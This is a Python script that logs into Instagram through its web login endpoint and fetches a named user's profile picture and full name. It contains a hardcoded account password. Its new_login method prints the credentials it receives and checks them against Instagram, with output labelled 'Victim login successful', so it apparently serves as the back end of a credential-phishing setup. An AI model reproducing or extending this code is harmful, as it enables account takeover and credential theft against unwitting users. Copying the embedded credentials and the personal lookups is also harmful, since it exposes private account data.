from bs4 import BeautifulSoup
import requests
import json
from datetime import datetime

class Instagram_User():

    def __init__(self,username):
        self.username = username


    def login(self):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        session =requests.Session()

        time = int(datetime.now().timestamp())
        response = requests.get(link)
        csrf = response.cookies['csrftoken']
        password = "aarya123"

        payload = {
            'username': '___aaryan___k___',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        login_header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf
        }

        login_response = session.post(login_url, data=payload, headers=login_header)
        json_data = json.loads(login_response.text)
        print('Bot',json_data)
        if json_data["authenticated"]:
            
            print("login successful")
            return session
            
        else:
            return None

    def new_login(self,username,password):
        print(username,password)
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        session =requests.Session()

        time = int(datetime.now().timestamp())
        response = requests.get(link)
        csrf = response.cookies['csrftoken']

        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        login_header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf
        }

        login_response = session.post(login_url, data=payload, headers=login_header)
        json_data = json.loads(login_response.text)
        print('Victime',json_data)
        if json_data["authenticated"]:

            print("Victim login successful")
            return "sucess"
            
        else:
            return None

    def check_user(self):

        try:
            response = requests.get(f"https://www.instagram.com/{self.username}/?__a=1")
            response = response.json()
            print(response)
            return response['graphql']['user']['profile_pic_url_hd'],response['graphql']['user']['full_name']
        except:
            session = self.login()
            if session !=None:
                response = session.get(f"https://www.instagram.com/{self.username}/?__a=1")
                response = response.json()
                # print(response['seo_category_infos'])
                return response['graphql']['user']['profile_pic_url_hd'],response['graphql']['user']['full_name']

            else:
                return None



print(Instagram_User('sushanaacharya_').check_user())